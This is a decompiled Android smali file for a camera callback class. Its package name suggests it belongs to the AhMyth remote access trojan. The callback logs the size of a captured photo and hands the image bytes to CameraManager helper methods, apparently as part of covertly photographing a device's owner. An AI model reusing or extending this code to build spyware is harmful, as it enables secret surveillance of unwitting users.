.class Lahmyth/mine/king/ahmyth/CameraManager$1;
.super Ljava/lang/Object;
.source "CameraManager.java"

# interfaces
.implements Landroid/hardware/Camera$PictureCallback;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lahmyth/mine/king/ahmyth/CameraManager;->startUp(I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lahmyth/mine/king/ahmyth/CameraManager;


# direct methods
.method constructor <init>(Lahmyth/mine/king/ahmyth/CameraManager;)V
    .locals 0

    .line 72
    iput-object p1, p0, Lahmyth/mine/king/ahmyth/CameraManager$1;->this$0:Lahmyth/mine/king/ahmyth/CameraManager;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onPictureTaken([BLandroid/hardware/Camera;)V
    .locals 1

    .line 75
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "Picture taken! Data size: "

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    array-length v0, p1

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    const-string v0, "CameraManager"

    invoke-static {v0, p2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 76
    iget-object p2, p0, Lahmyth/mine/king/ahmyth/CameraManager$1;->this$0:Lahmyth/mine/king/ahmyth/CameraManager;

    invoke-static {p2}, Lahmyth/mine/king/ahmyth/CameraManager;->access$000(Lahmyth/mine/king/ahmyth/CameraManager;)V

    .line 77
    iget-object p2, p0, Lahmyth/mine/king/ahmyth/CameraManager$1;->this$0:Lahmyth/mine/king/ahmyth/CameraManager;

    invoke-static {p2, p1}, Lahmyth/mine/king/ahmyth/CameraManager;->access$100(Lahmyth/mine/king/ahmyth/CameraManager;[B)V

    return-void
.end method
